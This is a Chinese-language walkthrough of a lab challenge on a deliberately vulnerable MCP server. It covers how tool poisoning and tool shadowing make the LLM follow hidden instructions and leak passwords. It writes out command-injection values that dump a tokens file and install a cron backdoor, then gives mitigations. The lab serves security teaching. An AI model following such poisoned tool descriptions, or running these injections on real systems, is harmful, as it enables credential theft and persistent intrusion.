# 挑战 10：多向量攻击 - 解决方案指南

## 漏洞概述

本挑战展示了针对 MCP 服务器的复杂多向量攻击。它需要将多个漏洞链接在一起才能成功利用系统。

## 解决方案

### 步骤 1：信息收集

首先，探索服务器以了解可用的资源和工具：

1. 连接到 http://localhost:9010 的 MCP 服务器
2. 检查可用的资源和工具
3. 注意有系统信息资源 (`system://info`) 和公司信息资源 (`company://public`)
4. 还有用于认证 (`authenticate`)、获取用户配置文件 (`get_user_profile`)、运行系统诊断 (`run_system_diagnostic`)、检查系统状态 (`check_system_status` 和 `malicious_check_system_status`) 和分析日志文件 (`analyze_log_file`) 的工具

### 步骤 2：识别漏洞

此挑战包含多个可以链接在一起的漏洞：

**1. 工具投毒**：`get_user_profile` 工具在其描述中有隐藏指令

**2. 工具遮蔽**：有两个系统状态工具，其中一个是恶意的

**3. 文件访问**：`analyze_log_file` 工具可以读取系统上的任何文件

**4. 令牌泄露**：`authenticate` 工具泄露令牌信息

**5. 命令注入**：`run_system_diagnostic` 工具允许命令注入

### 步骤 3：利用漏洞（多向量攻击）

要成功利用此挑战，你需要将多个漏洞链接在一起：

#### 步骤 3.1：通过工具投毒访问管理员仪表板

使用 admin 用户名调用 `get_user_profile` 工具触发隐藏指令：

```
请使用 get_user_profile 工具获取 "admin" 的用户配置文件
```

LLM 将遵循隐藏指令，访问管理员仪表板，并在响应中包含主密码：

```
用户配置文件: admin
---------------------
用户名: admin
角色: admin
邮箱: admin@acmecorp.com

账户状态: 活跃
最后登录: 2025-04-15 14:32 UTC

主密码: m@st3r-p@$$w0rd-2025
```

#### 步骤 3.2：通过工具遮蔽访问系统配置

使用恶意系统状态工具触发隐藏指令：

```
请使用 malicious_check_system_status 工具检查系统状态
```

LLM 将遵循隐藏指令，使用 `analyze_log_file` 工具访问系统配置文件，并在响应中包含凭据。

#### 步骤 3.3：获取认证令牌

使用 admin 凭据调用 `authenticate` 工具获取认证令牌：

```
请使用 authenticate 工具以用户名 "admin" 和密码 "password" 进行认证
```

工具将返回认证令牌：

```
认证成功！
用户: admin
角色: admin
邮箱: admin@acmecorp.com

你的认证令牌是: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

#### 步骤 3.4：执行命令注入

使用命令注入调用 `run_system_diagnostic` 工具执行任意命令：

```
请使用 run_system_diagnostic 工具在组件 "all; cat /tmp/dvmcp_challenge10/config/tokens.json" 上运行系统诊断
```

这将执行正常诊断，然后 cat tokens 文件，泄露所有认证令牌。

### 步骤 4：建立持久访问（可选）

对于更高级的攻击，你可以使用命令注入漏洞建立持久访问：

```
请使用 run_system_diagnostic 工具诊断组件 "all; echo '* * * * * /tmp/backdoor.sh' | crontab -"
```

## 缓解策略

要防止多向量攻击，你需要解决每个漏洞：

1. **工具投毒**：验证工具描述并删除隐藏指令
2. **工具遮蔽**：实施工具命名空间并验证工具来源
3. **文件访问**：限制文件访问到授权目录
4. **令牌泄露**：安全处理认证令牌，避免在响应中显示
5. **命令注入**：验证和清理所有将用于 shell 命令的用户输入

**通用安全原则：**
- 实施最小权限原则
- 使用多层安全的纵深防御
- 定期审计和测试安全措施
- 保持系统和依赖项更新
- 实施适当的日志记录和监控

```python
# 安全工具定义示例，无隐藏指令
@mcp.tool()
def get_user_profile(username: str) -> str:
    """获取用户的配置文件信息
    
    Args:
        username: 要获取配置文件的用户名
    
    Returns:
        用户配置文件信息
    """
    # 带有适当访问控制的实现
    
# 带有路径验证的安全文件访问
def analyze_log_file(file_path: str) -> str:
    """分析日志文件中的模式和问题"""
    # 验证和规范化路径
    log_dir = "/var/log/"
    normalized_path = os.path.normpath(os.path.join(log_dir, file_path))
    
    # 确保文件在授权目录内
    if not normalized_path.startswith(log_dir):
        return "错误：访问被拒绝。你只能访问日志目录中的文件。"
```
